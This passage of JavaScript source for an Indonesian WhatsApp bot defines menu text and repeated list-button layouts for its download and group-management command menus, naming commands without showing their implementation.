        id: `.animebutton`, 
      },
      {
        header: "🌀 Other Menu",
        title: "🧃 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴛᴀᴍʙᴀʜᴀɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.othermenubutton`, 
      },
      {
        header: "⚙️ Owner Menu",
        title: "👑 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.ownermenubutton`, 
      },
      {
        header: "🫂 Grup Menu",
        title: "👥 ᴜɴᴛᴜᴋ ᴍᴇɴɪʜᴀᴛ ʟɪsᴛ ɢʀᴜᴘ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.groupmenubutton`, 
      },
      {
        header: "🕌 Islamic Menu",
        title: "📿 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.islamimenubutton`, 
      },
      {
        header: "📰 Berita Menu",
        title: "🗞️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.beritamenubutton`, 
      },
      {
        header: "✨ Quotes Menu",
        title: "📝 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.quotesmenubutton`, 
      },
      {
        header: "🖼️ Sticker Menu",
        title: "💬 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.stickermenubutton`, 
      },
      {
        header: "🔍 Stalking Menu",
        title: "🧿 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛᴀʟᴋɪɴɢ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.stalkermenubutton`, 
      },
      {
        header: "🔮 Primbon Menu",
        title: "🕯️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.primbonmenubutton`, 
      },
      {
        header: "🎖️ Certificate Menu",
        title: "📜 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇʀᴛɪғɪᴋᴀᴛ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.sertifikatmenubutton`, 
      },
      {
        header: "⬇️ Download Menu",
        title: "📥 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.downloadmenubutton`, 
      },
      {
        header: "📸 Ephoto Menu",
        title: "🖌️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴇᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.ephoto360menubutton`, 
      },
      {
        header: "🎭 Anonymous Menu",
        title: "🕵️‍♂️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.anonymousmenubutton`, 
      },
      {
        header: "🎲 Random Video",
        title: "📹 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.randomvideomenubutton`, 
      },
      {
        header: "🎬 Random Photo",
        title: "🖼️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.randomphotomenubutton`, 
      },
    ],
  },
  {
    title: `ɪɴғᴏʀᴍᴀsɪ ʏᴏɪᴍɪʏᴀ ᴀssɪsᴛᴇɴᴛ`,
    highlight_label: `ᴘᴏᴘᴜʟᴇʀ`,
    rows: [
      {
        title: "🎗 ɪɴғᴏ ʙᴏᴛ",
        description: "ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ",
        id: `.infobot`,
      },
      {
        title: "💫 ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
        description: "ᴋᴇᴍʙᴀʟɪ ᴋᴇ ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
        id: `.menu`, 
          },
        ]},
    ]}
    listbut2(m.chat, teks, bet, m)

}

break
case 'downloadmenubutton': { 
let teks =`◤─「 \`DOWNLOAD MENU\` 」─✦
│⦿ 〔 _.tiktok_
│⦿ 〔 _.tiktokslide_
│⦿ 〔 _.videy_
│⦿ 〔 _.tiktokaudio_
│⦿ 〔 _.filmsearch_
│⦿ 〔 _.ytsearch <mp3>_
│⦿ 〔 _.ytsearch2 <mp4>_
│⦿ 〔 _.ttsearch_
│⦿ 〔 _.teraboxdl_
│⦿ 〔 _.snackvideo_
│⦿ 〔 _.capcutdl_
│⦿ 〔 _.play_
│⦿ 〔 _.playyt_
│⦿ 〔 _.ytplay (link youtubenya)_
│⦿ 〔 _.playspotify_
│⦿ 〔 _.ytmp3_
│⦿ 〔 _.ytmp4_
│⦿ 〔 _.google_
│⦿ 〔 _.imdb_
│⦿ 〔 _.weather_
│⦿ 〔 _.cuaca_
│⦿ 〔 _.wanumber_
│⦿ 〔 _.instagram_
│⦿ 〔 _.facebook_
│⦿ 〔 _.twittervid_
│⦿ 〔 _.spotify_
│⦿ 〔 _.gitclone_
│⦿ 〔 _.happymod_
│⦿ 〔 _.gdrive_
│⦿ 〔 _.pinterest_
│⦿ 〔 _.ringtone_
◣──────────❈`
const bet = {
    title: "LIST MENU",
    sections: [
  {
    title: `ʟɪsᴛ ʏᴀɴɢ sᴇʀɪɴɢ ᴅɪᴘᴀᴋᴀɪ`,
    highlight_label: `🔥ᴘᴏᴘᴜʟᴇʀ`,
    rows: [
      {
        header: "🧭 All Menu",
        title: "🗂️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴍᴇɴᴜ ᴀʟʟ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.allmenu`, 
      },
    ],
  },
  {
    title: `ᴍɪɴᴇᴄʀᴀғᴛ sᴛᴀᴛᴜs ғɪᴛᴜʀ`,
    highlight_label: ``,
    rows: [
      {
        header: "⛏️ MC Status",
        title: "🧱 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴄ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.mcstatus`, 
      },
    ],
  },
  {
    title: `ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ`,
    highlight_label: `🛠️ᴘᴇᴍʙᴀʀᴜᴀɴ ғɪᴛᴜʀ`,
    rows: [
      {
        header: "🆕 New Updates",
        title: "📢 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ᴛᴇʀʙᴀʀᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.newupdatebutton`, 
      },
      {
        header: "🛠️ Fix Fitur",
        title: "🧩 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʏᴀɴɢ ᴅɪғɪx",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.fixbutton`, 
      },
      {
        header: "🛍 Shop menu",
        title: "📦 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ꜰɪᴛᴜʀ sʜᴏᴘᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.shopmenubutton`, 
      },
      {
        header: "⚡ Cpanel menu",
        title: "🛒 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ꜰɪᴛᴜʀ ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.cpanelbutton`, 
      },
    ],
  },
  {
    title: `ʟɪsᴛ ᴍᴇɴᴜ ʏᴀɴɢ ᴅɪᴘɪsᴀʜᴋᴀɴ`,
    highlight_label: ``,
    rows: [
      {
        header: "📜 Peraturan",
        title: "⚖️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴜʟᴇs ʙᴏᴛ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.bacaperaturanbutton`, 
      },
      {
        header: "🎁 Donasi",
        title: "💖 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴅᴏɴᴀsɪ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.donasibutton`, 
      },
      {
        header: "🤖 AI Menu",
        title: "✨ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴀɪ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.aimenubutton`, 
      },
      {
        header: "🎉 Fun Menu",
        title: "🤣 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ғᴜɴ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.funmenubutton`, 
      },
      {
        header: "🕹️ RPG Menu",
        title: "⚔️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ʀᴘɢ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.rpgmenubutton`, 
      },
      {
        header: "📤 Push Menu",
        title: "📨 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ᴘᴜsʜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.pushmenubutton`, 
      },
      {
        header: "🎥 Asupan Menu",
        title: "🥤 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴀsᴜᴘᴀɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.nsfwmenubutton`, 
      },
      {
        header: "🧩 Game Menu",
        title: "🎮 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ɢᴀᴍᴇ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.gamemenubutton`, 
      },
      {
        header: "🛍️ Store Menu",
        title: "🛒 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛᴏʀᴇ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.storemenubutton`, 
      },
      {
        header: "🎌 Anime Menu",
        title: "📺 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ᴀɴɪᴍᴇ ᴘᴀɴᴇʟ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.animebutton`, 
      },
      {
        header: "🌀 Other Menu",
        title: "🧃 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴛᴀᴍʙᴀʜᴀɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.othermenubutton`, 
      },
      {
        header: "⚙️ Owner Menu",
        title: "👑 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.ownermenubutton`, 
      },
      {
        header: "🫂 Grup Menu",
        title: "👥 ᴜɴᴛᴜᴋ ᴍᴇɴɪʜᴀᴛ ʟɪsᴛ ɢʀᴜᴘ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.groupmenubutton`, 
      },
      {
        header: "🕌 Islamic Menu",
        title: "📿 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.islamimenubutton`, 
      },
      {
        header: "📰 Berita Menu",
        title: "🗞️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.beritamenubutton`, 
      },
      {
        header: "✨ Quotes Menu",
        title: "📝 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.quotesmenubutton`, 
      },
      {
        header: "🖼️ Sticker Menu",
        title: "💬 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.stickermenubutton`, 
      },
      {
        header: "🔍 Stalking Menu",
        title: "🧿 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛᴀʟᴋɪɴɢ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.stalkermenubutton`, 
      },
      {
        header: "🔮 Primbon Menu",
        title: "🕯️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.primbonmenubutton`, 
      },
      {
        header: "🎖️ Certificate Menu",
        title: "📜 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇʀᴛɪғɪᴋᴀᴛ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.sertifikatmenubutton`, 
      },
      {
        header: "⬇️ Download Menu",
        title: "📥 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.downloadmenubutton`, 
      },
      {
        header: "📸 Ephoto Menu",
        title: "🖌️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴇᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.ephoto360menubutton`, 
      },
      {
        header: "🎭 Anonymous Menu",
        title: "🕵️‍♂️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.anonymousmenubutton`, 
      },
      {
        header: "🎲 Random Video",
        title: "📹 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.randomvideomenubutton`, 
      },
      {
        header: "🎬 Random Photo",
        title: "🖼️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.randomphotomenubutton`, 
      },
    ],
  },
  {
    title: `ɪɴғᴏʀᴍᴀsɪ ʏᴏɪᴍɪʏᴀ ᴀssɪsᴛᴇɴᴛ`,
    highlight_label: `ᴘᴏᴘᴜʟᴇʀ`,
    rows: [
      {
        title: "🎗 ɪɴғᴏ ʙᴏᴛ",
        description: "ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ",
        id: `.infobot`,
      },
      {
        title: "💫 ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
        description: "ᴋᴇᴍʙᴀʟɪ ᴋᴇ ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
        id: `.menu`, 
          },
        ]},
    ]}
    listbut2(m.chat, teks, bet, m)

}

break
case 'groupmenubutton': {
let teks =`◤─「 \`GROUP MENU\` 」─✦
│⦿ 〔 _.sider_
│⦿ 〔 _.autoaigc_
│⦿ 〔 _.warcall_
│⦿ 〔 _.autosimi_
│⦿ 〔 _.yoimiyachat_
│⦿ 〔 _.mute_
│⦿ 〔 _.welcome on/off_
│⦿ 〔 _.antilink_
│⦿ 〔 _.antiwame_
│⦿ 〔 _.linkgc_
│⦿ 〔 _.invite_
│⦿ 〔 _.ephemeral_
│⦿ 〔 _.delete_
│⦿ 〔 _.setppgroup_
│⦿ 〔 _.delppgroup_
│⦿ 〔 _.setname_
│⦿ 〔 _.setdesc_
│⦿ 〔 _.add_
│⦿ 〔 _.kick_
│⦿ 〔 _.promote_
│⦿ 〔 _.demote_
│⦿ 〔 _.hidetag_
│⦿ 〔 _.totag_
│⦿ 〔 _.tagall_
│⦿ 〔 _.editinfo_
│⦿ 〔 _.opentime_
│⦿ 〔 _.closetime_
│⦿ 〔 _.resetlink_
│⦿ 〔 _.getbio_
│⦿ 〔 _.vote_
│⦿ 〔 _.upvote_
│⦿ 〔 _.downvote_
│⦿ 〔 _.checkvote_
│⦿ 〔 _.delvote_
│⦿ 〔 _.autostickergc_
│⦿ 〔 _.antilinkgc_
│⦿ 〔 _.antiwame_
│⦿ 〔 _.antilinkall_
│⦿ 〔 _.antilinktiktok_
│⦿ 〔 _.antilinkfb_
│⦿ 〔 _.antilinktwitter_
│⦿ 〔 _.antilinkig_
│⦿ 〔 _.antilinktg_
│⦿ 〔 _.antilinkytvid_
│⦿ 〔 _.antilinkytch_
│⦿ 〔 _.antivirus_
│⦿ 〔 _.antitoxic_
│⦿ 〔 _.nsfw_
│⦿ 〔 _.react_
◣──────────❈`
const bet = {
    title: "LIST MENU",
    sections: [
  {
    title: `ʟɪsᴛ ʏᴀɴɢ sᴇʀɪɴɢ ᴅɪᴘᴀᴋᴀɪ`,
    highlight_label: `🔥ᴘᴏᴘᴜʟᴇʀ`,
    rows: [
      {
        header: "🧭 All Menu",
        title: "🗂️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴍᴇɴᴜ ᴀʟʟ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.allmenu`, 
      },
    ],
  },
  {
    title: `ᴍɪɴᴇᴄʀᴀғᴛ sᴛᴀᴛᴜs ғɪᴛᴜʀ`,
    highlight_label: ``,
    rows: [
      {
        header: "⛏️ MC Status",
        title: "🧱 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴄ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.mcstatus`, 
      },
    ],
  },
  {
    title: `ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ`,
    highlight_label: `🛠️ᴘᴇᴍʙᴀʀᴜᴀɴ ғɪᴛᴜʀ`,
    rows: [
      {
        header: "🆕 New Updates",
        title: "📢 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ᴛᴇʀʙᴀʀᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.newupdatebutton`, 
      },
      {
        header: "🛠️ Fix Fitur",
        title: "🧩 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʏᴀɴɢ ᴅɪғɪx",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.fixbutton`, 
      },
      {
        header: "🛍 Shop menu",
        title: "📦 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ꜰɪᴛᴜʀ sʜᴏᴘᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.shopmenubutton`, 
      },
      {
        header: "⚡ Cpanel menu",
        title: "🛒 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ꜰɪᴛᴜʀ ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.cpanelbutton`, 
      },
    ],
  },
  {
    title: `ʟɪsᴛ ᴍᴇɴᴜ ʏᴀɴɢ ᴅɪᴘɪsᴀʜᴋᴀɴ`,
    highlight_label: ``,
    rows: [
      {
        header: "📜 Peraturan",
        title: "⚖️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴜʟᴇs ʙᴏᴛ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.bacaperaturanbutton`, 
      },
      {
        header: "🎁 Donasi",
        title: "💖 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴅᴏɴᴀsɪ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.donasibutton`, 
      },
      {
        header: "🤖 AI Menu",
        title: "✨ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴀɪ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.aimenubutton`, 
      },
      {
        header: "🎉 Fun Menu",
        title: "🤣 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ғᴜɴ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.funmenubutton`, 
      },
      {
        header: "🕹️ RPG Menu",
        title: "⚔️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ʀᴘɢ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.rpgmenubutton`, 
      },
      {
        header: "📤 Push Menu",
        title: "📨 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ᴘᴜsʜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.pushmenubutton`, 
      },
      {
        header: "🎥 Asupan Menu",
        title: "🥤 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴀsᴜᴘᴀɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.nsfwmenubutton`, 
      },
      {
        header: "🧩 Game Menu",
        title: "🎮 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ɢᴀᴍᴇ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.gamemenubutton`, 
      },
      {
        header: "🛍️ Store Menu",
        title: "🛒 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛᴏʀᴇ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.storemenubutton`, 
      },
      {
        header: "🎌 Anime Menu",
        title: "📺 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ᴀɴɪᴍᴇ ᴘᴀɴᴇʟ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.animebutton`, 
      },
      {
        header: "🌀 Other Menu",
        title: "🧃 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴛᴀᴍʙᴀʜᴀɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.othermenubutton`, 
      },
      {
        header: "⚙️ Owner Menu",
        title: "👑 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.ownermenubutton`, 
      },
      {
        header: "🫂 Grup Menu",
        title: "👥 ᴜɴᴛᴜᴋ ᴍᴇɴɪʜᴀᴛ ʟɪsᴛ ɢʀᴜᴘ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.groupmenubutton`, 
      },
      {
        header: "🕌 Islamic Menu",
        title: "📿 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.islamimenubutton`, 
      },
      {
        header: "📰 Berita Menu",
        title: "🗞️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.beritamenubutton`, 
      },
      {
        header: "✨ Quotes Menu",
        title: "📝 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.quotesmenubutton`, 
      },
      {
        header: "🖼️ Sticker Menu",
        title: "💬 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.stickermenubutton`, 
      },
      {
        header: "🔍 Stalking Menu",
        title: "🧿 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛᴀʟᴋɪɴɢ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.stalkermenubutton`, 
      },
      {
        header: "🔮 Primbon Menu",
        title: "🕯️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.primbonmenubutton`, 
      },
      {
        header: "🎖️ Certificate Menu",
        title: "📜 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇʀᴛɪғɪᴋᴀᴛ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.sertifikatmenubutton`, 
      },
      {
        header: "⬇️ Download Menu",
        title: "📥 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.downloadmenubutton`, 
      },
      {
        header: "📸 Ephoto Menu",
        title: "🖌️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴇᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.ephoto360menubutton`, 
      },
      {
        header: "🎭 Anonymous Menu",
        title: "🕵️‍♂️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.anonymousmenubutton`, 
      },
      {
        header: "🎲 Random Video",
        title: "📹 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.randomvideomenubutton`, 
      },
      {
        header: "🎬 Random Photo",
        title: "🖼️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.randomphotomenubutton`, 
      },
    ],
  },
  {
    title: `ɪɴғᴏʀᴍᴀsɪ ʏᴏɪᴍɪʏᴀ ᴀssɪsᴛᴇɴᴛ`,
    highlight_label: `ᴘᴏᴘᴜʟᴇʀ`,
    rows: [
      {
        title: "🎗 ɪɴғᴏ ʙᴏᴛ",
        description: "ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ",
        id: `.infobot`,
      },
      {
        title: "💫 ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
